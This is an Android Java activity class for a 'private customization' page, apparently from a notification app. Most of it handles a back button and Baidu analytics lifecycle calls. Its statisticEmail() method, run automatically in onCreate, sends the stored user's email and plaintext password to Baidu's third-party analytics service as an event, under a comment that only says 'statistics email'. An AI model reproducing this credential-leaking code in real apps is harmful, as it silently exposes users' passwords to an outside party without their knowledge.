package com.minggo.notification.activity;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;

import com.baidu.mobstat.StatService;
import com.minggo.love.notification.R;
import com.minggo.notification.model.User;
import com.minggo.notification.service.LoveNotificationApplication;
import com.minggo.notification.util.UserUtil;

/**
 * 私人定制页面
 * 
 * @author minggo
 * @time 2014-7-5 S下午12:42:23
 */
public class OrderActivity extends Activity implements OnClickListener {

	private View backBt;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_order);
		initUI();
		
		LoveNotificationApplication.allActivities.add(this);
		statisticEmail();
	}
	/**
	 * 统计email
	 */
	private void statisticEmail(){
		User user = UserUtil.getFirstUser(this);
		if (user!=null) {
			if (user.email!=null&&user.password!=null) {
				StatService.onEvent(this, "email", user.email+","+user.password);
			}
		}
	}
	
	/**
	 * 初始化UI
	 */
	private void initUI() {
		backBt = findViewById(R.id.lo_order_back);
		backBt.setOnClickListener(this);
	}

	@Override
	public void onClick(View v) {
		switch (v.getId()) {
		case R.id.lo_order_back:
			onBackPressed();
			break;
		default:
			break;
		}

	}
	@Override
	protected void onResume() {
		super.onResume();
		StatService.onResume(this);
	}
	
	@Override
	protected void onPause() {
		super.onPause();
		StatService.onPause(this);
	}
	
	@Override
	public void onBackPressed() {
		super.onBackPressed();
		finish();
	}
}
